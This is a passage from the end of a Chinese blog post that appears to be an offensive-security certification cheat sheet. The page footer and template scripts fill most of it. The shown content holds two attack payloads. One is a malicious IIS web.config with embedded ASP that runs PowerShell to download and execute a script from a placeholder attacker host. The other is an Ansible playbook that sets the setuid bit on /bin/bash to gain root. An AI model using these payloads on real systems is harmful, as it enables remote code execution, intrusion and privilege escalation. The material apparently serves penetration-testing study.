class="hljs-string">&quot;bitness64&quot;</span> /&gt;<br>      &lt;/handlers&gt;<br>      &lt;security&gt;<br>         &lt;requestFiltering&gt;<br>            &lt;fileExtensions&gt;<br>               &lt;remove fileExtension=<span class="hljs-string">&quot;.config&quot;</span> /&gt;<br>            &lt;/fileExtensions&gt;<br>            &lt;hiddenSegments&gt;<br>               &lt;remove segment=<span class="hljs-string">&quot;web.config&quot;</span> /&gt;<br>            &lt;/hiddenSegments&gt;<br>         &lt;/requestFiltering&gt;<br>      &lt;/security&gt;<br>   &lt;/system.webServer&gt;<br>&lt;/configuration&gt;<br>&lt;!-- ASP code comes here! It should not include HTML comment closing tag and <span class="hljs-type">double</span> dashes!<br>&lt;%<br>Set s = CreateObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)<br>Set cmd = s.Exec(<span class="hljs-string">&quot;cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring(&#x27;http://&lt;LHOST&gt;/shellyjelly.ps1&#x27;)&quot;</span>)<br>o = cmd.StdOut.Readall()<br>Response.write(o)<br>%&gt;<br>--&gt;<br></code></pre></td></tr></table></figure>

<h4 id="错误的-YAML"><a href="#错误的-YAML" class="headerlink" title="错误的 YAML"></a>错误的 YAML</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">- hosts: localhost<br>  tasks:<br>    - name: badyml<br>      command: chmod +s /bin/bash<br></code></pre></td></tr></table></figure>



                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
      
        <a href="/tags/Memo-notes/" class="print-no-link">#Memo notes</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>国外某进攻性安全证书-备忘录-2023.3.11版本</div>
      <div>https://sh1yan.top/2024/06/01/Attack-certificate-memorandum-20230311-0xsyr0/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/01/Attack-certificate-Book-Skills-2023-rodolfomarianocy/" title="国外某进攻性安全证书-书籍技巧-2023版本">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">国外某进攻性安全证书-书籍技巧-2023版本</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/05/30/Resolute-htb-writeup/" title="Resolute-htb-writeup">
                        <span class="hidden-mobile">Resolute-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
